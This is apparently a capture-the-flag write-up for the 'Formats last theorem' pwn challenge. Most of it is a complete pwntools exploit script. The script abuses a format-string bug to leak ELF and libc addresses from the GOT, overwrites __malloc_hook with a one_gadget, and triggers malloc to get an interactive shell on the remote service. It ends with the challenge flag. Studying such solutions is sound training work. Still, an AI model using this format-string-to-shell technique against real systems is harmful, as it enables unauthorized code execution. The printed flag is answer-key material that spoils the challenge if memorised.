# Formats last theorem

## Description

I dare you to hook the malloc

`nc dctf-chall-formats-last-theorem.westeurope.azurecontainer.io 7482`

[formats_last_theorem](formats_last_theorem) \
[Dockerfile](Dockerfile) 

## Solution

```python
from pwn import *
import sys

nc = remote('dctf-chall-formats-last-theorem.westeurope.azurecontainer.io', 7482)


def send(payload):
    assert b'\n' not in payload
    nc.recvline()
    nc.sendline(payload)
    nc.recvline()
    l = nc.recvline().rstrip()
    nc.recvline()
    return l


def read(addr):
    try:
        return u64(send(b'%7$sAAAA' + p64(addr))[:6] + b'\x00\x00')
    except:
        log.failure("Error: read")
        exit(1)


def write(addr, val, num_bytes):
    b = sorted(enumerate(p64(val)[:num_bytes]), key=lambda x: x[1])
    written = 0
    payload = []

    for i, x in b:
        if written < x:
            payload.extend(f"%{x - written}c".encode())
            written = x
        payload.extend(f"%{11 + i}$hhn".encode())
    
    assert len(payload) < 40
    payload.extend([0] * (40 - len(payload)))
    for i in range(num_bytes):
        payload.extend(p64(addr + i))
    
    try:
        send(bytes(payload))
    except:
        log.failure("Error: write")
        exit(1)



offset = int(send(b'%15$p'), 0) - 0x10081d
log.info(f"elf @ {hex(offset)}")

puts_got   = offset + 0x300fb8
printf_got = offset + 0x300fc0
alarm_got  = offset + 0x300fc8

puts   = read(puts_got)
printf = read(printf_got)
alarm  = read(alarm_got)

libc        =  puts   - 0x080aa0
assert libc == printf - 0x064f70
assert libc == alarm  - 0x0e4610

log.info(f"libc @ {hex(libc)}")

malloc_hook = libc + 0x3ebc30
one_gadget  = libc + 0x04f432

write(malloc_hook, one_gadget, 3)

nc.recvline()
nc.sendline('%100000c')

nc.interactive()
```

#### **FLAG >>** `dctf{N0t_all_7h30r3ms_s0und_g00d}`